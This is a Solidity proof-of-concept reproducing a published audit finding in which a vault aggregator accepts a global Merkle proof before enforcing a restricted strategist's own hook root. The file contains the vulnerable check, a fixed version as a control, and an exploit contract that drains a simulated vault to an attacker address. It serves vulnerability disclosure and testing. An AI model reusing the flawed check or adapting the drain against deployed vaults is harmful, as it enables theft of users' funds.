// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Superform v2-periphery finding 63076:
// "strategistHooksRoot permissions may be circumvented by any Strategist in favor
//  of global permissions" (Spearbit, MiloTruck).
//
// SuperVaultAggregator.validateHook tries the GLOBAL merkle root FIRST and returns
// `true` as soon as a valid global proof is supplied — BEFORE it ever enforces the
// strategy-specific hooks root. A strategist whose vault has been sandboxed with a
// restrictive `strategyHooksRoot` (that intentionally EXCLUDES the globally-permitted
// `transferErc20` hook) escapes the sandbox simply by passing a valid GLOBAL proof
// (and an empty strategy proof). The globally-permitted ERC20-transfer hook then
// executes and the restricted strategist drains the vault's tokens to itself.
//
// FAITHFULNESS:
//   * The decision logic of `validateHook` is the verbatim as-audited (inlined)
//     branch logic from the finding: the `&&` global/strategy veto check, the
//     `length==0 && length==0` guard, and the global-proof-first
//     `MerkleProof.verify(...) -> return true`. The `_createLeaf` formula is copied
//     verbatim from the real SuperVaultAggregator.sol (StandardMerkleTree
//     double-hash leaf). `MerkleProof` is the standard OpenZeppelin library.
//   * Only the opaque boundaries are minimal faithful doubles: the ERC20 token
//     (`MiniToken`), and `MiniVault` — a minimal stand-in for the
//     SuperVaultStrategy.executeHooks / transferErc20Hook path that executes the
//     validated ERC20 transfer. The vulnerable boundary (validateHook) is real.
// ─────────────────────────────────────────────────────────────────────────────

// ── OpenZeppelin MerkleProof (standard library, verbatim v5 logic) ───────────
library MerkleProof {
    function verify(bytes32[] memory proof, bytes32 root, bytes32 leaf) internal pure returns (bool) {
        return processProof(proof, leaf) == root;
    }

    function processProof(bytes32[] memory proof, bytes32 leaf) internal pure returns (bytes32) {
        bytes32 computedHash = leaf;
        for (uint256 i = 0; i < proof.length; i++) {
            computedHash = _hashPair(computedHash, proof[i]);
        }
        return computedHash;
    }

    function _hashPair(bytes32 a, bytes32 b) private pure returns (bytes32) {
        return a < b ? _efficientHash(a, b) : _efficientHash(b, a);
    }

    function _efficientHash(bytes32 a, bytes32 b) private pure returns (bytes32 value) {
        assembly {
            mstore(0x00, a)
            mstore(0x20, b)
            value := keccak256(0x00, 0x40)
        }
    }
}

// ── ERC20 double (opaque vault asset) ────────────────────────────────────────
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public immutable decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

// ── Aggregator interface + shared struct ─────────────────────────────────────
interface ISuperVaultAggregator {
    struct ValidateHookArgs {
        address hookAddress;
        bytes hookArgs;
        bytes32[] globalProof;
        bytes32[] strategyProof;
    }

    function validateHook(address strategy, ValidateHookArgs calldata args) external view returns (bool isValid);
}

// ── Shared state layout for both aggregator variants ─────────────────────────
abstract contract SuperVaultAggregatorBase is ISuperVaultAggregator {
    struct StrategyData {
        bytes32 managerHooksRoot;
        bool hooksRootVetoed;
    }

    bytes32 internal _globalHooksRoot;
    bool internal _globalHooksRootVetoed;
    mapping(address => StrategyData) internal _strategyData;

    // Minimal faithful doubles of the timelocked root-registration setters.
    function setGlobalHooksRoot(bytes32 root) external {
        _globalHooksRoot = root;
    }

    function setGlobalVeto(bool vetoed) external {
        _globalHooksRootVetoed = vetoed;
    }

    function setStrategyHooksRoot(address strategy, bytes32 root) external {
        _strategyData[strategy].managerHooksRoot = root;
    }

    function setStrategyVeto(address strategy, bool vetoed) external {
        _strategyData[strategy].hooksRootVetoed = vetoed;
    }

    function getStrategyHooksRoot(address strategy) external view returns (bytes32) {
        return _strategyData[strategy].managerHooksRoot;
    }

    /// @notice Creates a leaf node for Merkle verification from hook address and arguments.
    /// @dev Verbatim from SuperVaultAggregator.sol `_createLeaf` — matches
    ///      StandardMerkleTree's standardLeafHash: keccak256(keccak256(abi.encode(...))).
    function _createLeaf(address hookAddress, bytes calldata hookArgs) internal pure returns (bytes32) {
        return keccak256(bytes.concat(keccak256(abi.encode(hookAddress, hookArgs))));
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE aggregator — verbatim as-audited (inlined) validateHook logic.
// ─────────────────────────────────────────────────────────────────────────────
contract SuperVaultAggregator is SuperVaultAggregatorBase {
    function validateHook(
        address strategy,
        ValidateHookArgs calldata args
    )
        external
        view
        override
        returns (bool isValid)
    {
        bytes32 leaf = _createLeaf(args.hookAddress, args.hookArgs);

        bytes32[] calldata globalProof = args.globalProof;
        bytes32[] calldata strategyProof = args.strategyProof;

        bool globalHooksVetoed = _globalHooksRootVetoed;
        bool strategyHooksVetoed = _strategyData[strategy].hooksRootVetoed;

        if (globalHooksVetoed && strategyHooksVetoed) {
            return false;
        }

        uint256 lengthGlobalProof = globalProof.length;
        uint256 lengthStrategyProof = strategyProof.length;

        if (lengthGlobalProof == 0 && lengthStrategyProof == 0) {
            return false;
        }

        // First try to verify against the global root if provided
        if (lengthGlobalProof > 0 && !globalHooksVetoed) {
            // Only validate against global root if it exists
            if (_globalHooksRoot != bytes32(0) && MerkleProof.verify(globalProof, _globalHooksRoot, leaf)) { // @> global proof short-circuits to `true` BEFORE any strategy-root enforcement — a sandboxed strategist escapes
                return true;
            }
        }

        // Then try the strategy root
        if (lengthStrategyProof > 0 && !strategyHooksVetoed) {
            bytes32 strategyRoot = _strategyData[strategy].managerHooksRoot;
            if (strategyRoot != bytes32(0) && MerkleProof.verify(strategyProof, strategyRoot, leaf)) {
                return true;
            }
        }

        return false;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED aggregator — negative control. Per the report recommendation: when a
// strategyHooksRoot exists, disallow global proofs and enforce strategy-level
// permissions.
// ─────────────────────────────────────────────────────────────────────────────
contract SuperVaultAggregatorFixed is SuperVaultAggregatorBase {
    function validateHook(
        address strategy,
        ValidateHookArgs calldata args
    )
        external
        view
        override
        returns (bool isValid)
    {
        bytes32 leaf = _createLeaf(args.hookAddress, args.hookArgs);

        bytes32[] calldata globalProof = args.globalProof;
        bytes32[] calldata strategyProof = args.strategyProof;

        bool globalHooksVetoed = _globalHooksRootVetoed;
        bool strategyHooksVetoed = _strategyData[strategy].hooksRootVetoed;

        if (globalHooksVetoed && strategyHooksVetoed) {
            return false;
        }

        bytes32 strategyRoot = _strategyData[strategy].managerHooksRoot;

        // FIX: a strategy that has opted into a restrictive strategyHooksRoot is
        // sandboxed. Only its own root may authorize hooks; global proofs are
        // disallowed while a strategy root exists.
        if (strategyRoot != bytes32(0)) {
            if (strategyHooksVetoed || strategyProof.length == 0) {
                return false;
            }
            return MerkleProof.verify(strategyProof, strategyRoot, leaf);
        }

        // No strategy root set: fall back to global permissions.
        if (globalProof.length == 0 || globalHooksVetoed || _globalHooksRoot == bytes32(0)) {
            return false;
        }
        return MerkleProof.verify(globalProof, _globalHooksRoot, leaf);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// MiniVault — minimal faithful double of the SuperVaultStrategy.executeHooks /
// transferErc20Hook execution path. Holds the vault's ERC20 and executes a
// globally-permitted transferErc20 hook ONLY if the aggregator validates it.
// ─────────────────────────────────────────────────────────────────────────────
contract MiniVault {
    ISuperVaultAggregator public immutable aggregator;
    address public immutable strategy; // the restricted strategist
    MiniToken public immutable token;

    constructor(ISuperVaultAggregator _aggregator, address _strategy, MiniToken _token) {
        aggregator = _aggregator;
        strategy = _strategy;
        token = _token;
    }

    /// @notice Executes a transferErc20 hook after the aggregator authorizes it.
    /// @dev hookArgs encodes (to, amount) for the transferErc20 hook.
    function executeTransferHook(
        address hookAddress,
        bytes calldata hookArgs,
        bytes32[] calldata globalProof,
        bytes32[] calldata strategyProof
    )
        external
        returns (bool)
    {
        require(msg.sender == strategy, "ONLY_STRATEGIST");

        ISuperVaultAggregator.ValidateHookArgs memory a = ISuperVaultAggregator.ValidateHookArgs({
            hookAddress: hookAddress,
            hookArgs: hookArgs,
            globalProof: globalProof,
            strategyProof: strategyProof
        });

        bool ok = aggregator.validateHook(strategy, a);
        require(ok, "HOOK_NOT_PERMITTED");

        (address to, uint256 amount) = abi.decode(hookArgs, (address, uint256));
        token.transfer(to, amount); // the globally-permitted ERC20 transfer executes
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver. The Exploit IS the restricted strategist. Its vault is
// sandboxed by a strategyHooksRoot that EXCLUDES the transferErc20 leaf, yet it
// escapes via a valid GLOBAL proof and drains 1000 STOLEN-USDC to the attacker.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    // Hook identities (leaf preimage = hookAddress + args).
    address internal constant TRANSFER_HOOK = address(uint160(0xF1F1)); // transferErc20Hook
    address internal constant DEPOSIT_HOOK = address(uint160(0xD3D3)); // a globally-listed deposit hook
    address internal constant STRAT_HOOK_A = address(uint160(0xA1A1)); // strategy-allowed hook
    address internal constant STRAT_HOOK_B = address(uint160(0xB2B2)); // strategy-allowed hook

    uint256 internal constant AMOUNT = 1000 * 1e6; // 1000 STOLEN-USDC (6 decimals)

    // Deployed pieces (constructor).
    MiniToken public token;
    SuperVaultAggregator public aggregator;
    SuperVaultAggregatorFixed public aggregatorFixed;
    MiniVault public vault;
    MiniVault public fixedVault;

    // Results the driver asserts on.
    uint256 public attackerStolen;
    uint256 public vaultBalanceAfter;
    bool public fixedReturnsFalse;
    uint256 public fixedVaultBalanceAfter;
    address public tokenAddr;
    address public aggregatorAddr;

    constructor() {
        token = new MiniToken("Stolen USDC", "STOLEN-USDC", 6); // index 0
        aggregator = new SuperVaultAggregator(); // index 1
        aggregatorFixed = new SuperVaultAggregatorFixed(); // index 2
        vault = new MiniVault(ISuperVaultAggregator(address(aggregator)), address(this), token); // index 3
        fixedVault = new MiniVault(ISuperVaultAggregator(address(aggregatorFixed)), address(this), token); // index 4

        tokenAddr = address(token);
        aggregatorAddr = address(aggregator);
    }

    function _createLeaf(address hookAddress, bytes memory hookArgs) internal pure returns (bytes32) {
        return keccak256(bytes.concat(keccak256(abi.encode(hookAddress, hookArgs))));
    }

    function _hashPair(bytes32 a, bytes32 b) internal pure returns (bytes32) {
        return a < b ? keccak256(abi.encodePacked(a, b)) : keccak256(abi.encodePacked(b, a));
    }

    function run() external payable {
        // --- the transferErc20 hook the strategist wants to abuse ---
        bytes memory hookArgs = abi.encode(ATTACKER, AMOUNT); // (to, amount)
        bytes32 leafTransfer = _createLeaf(TRANSFER_HOOK, hookArgs);

        // --- GLOBAL 2-leaf tree INCLUDES the transferErc20 leaf ---
        // Global permissions list transferErc20 alongside a deposit hook.
        bytes32 leafDeposit = _createLeaf(DEPOSIT_HOOK, abi.encode(address(0), uint256(0)));
        bytes32 globalRoot = _hashPair(leafTransfer, leafDeposit);
        aggregator.setGlobalHooksRoot(globalRoot);
        aggregatorFixed.setGlobalHooksRoot(globalRoot);

        // proof for the transfer leaf against the global root = [sibling], length 1 > 0
        bytes32[] memory globalProof = new bytes32[](1);
        globalProof[0] = leafDeposit;

        // --- STRATEGY 2-leaf tree EXCLUDES the transferErc20 leaf (sandbox) ---
        // The vault creator restricted this strategist to hooks A and B only.
        bytes32 leafA = _createLeaf(STRAT_HOOK_A, abi.encode(uint256(1)));
        bytes32 leafB = _createLeaf(STRAT_HOOK_B, abi.encode(uint256(2)));
        bytes32 strategyRoot = _hashPair(leafA, leafB);
        aggregator.setStrategyHooksRoot(address(this), strategyRoot);
        aggregatorFixed.setStrategyHooksRoot(address(this), strategyRoot);
        // hooksRootVetoed stays false: the strategist is "restricted", NOT vetoed.

        // The strategist has NO valid strategy proof for the transfer leaf, so it
        // supplies an EMPTY strategy proof and relies on the global proof.
        bytes32[] memory emptyStrategyProof = new bytes32[](0);

        // --- fund both vaults with the tokens to be drained ---
        token.mint(address(vault), AMOUNT);
        token.mint(address(fixedVault), AMOUNT);

        // === EXPLOIT: sandboxed strategist drains via the global proof ===
        vault.executeTransferHook(TRANSFER_HOOK, hookArgs, globalProof, emptyStrategyProof);

        attackerStolen = token.balanceOf(ATTACKER);
        vaultBalanceAfter = token.balanceOf(address(vault));

        // === NEGATIVE CONTROL: the fixed aggregator refuses the same call ===
        ISuperVaultAggregator.ValidateHookArgs memory a = ISuperVaultAggregator.ValidateHookArgs({
            hookAddress: TRANSFER_HOOK,
            hookArgs: hookArgs,
            globalProof: globalProof,
            strategyProof: emptyStrategyProof
        });
        fixedReturnsFalse = !aggregatorFixed.validateHook(address(this), a);

        // The fixed vault execution reverts (hook not permitted); nothing is drained.
        try fixedVault.executeTransferHook(TRANSFER_HOOK, hookArgs, globalProof, emptyStrategyProof) {
            // should not reach here
        } catch {
            // expected: HOOK_NOT_PERMITTED
        }
        fixedVaultBalanceAfter = token.balanceOf(address(fixedVault));

        // Harm holds: restricted strategist stole the vault's tokens.
        require(attackerStolen == AMOUNT, "harm: attacker did not receive stolen tokens");
        require(vaultBalanceAfter == 0, "harm: vault not drained");
        require(fixedReturnsFalse, "control: fix should reject the global-proof bypass");
        require(fixedVaultBalanceAfter == AMOUNT, "control: fixed vault must not be drained");
    }
}
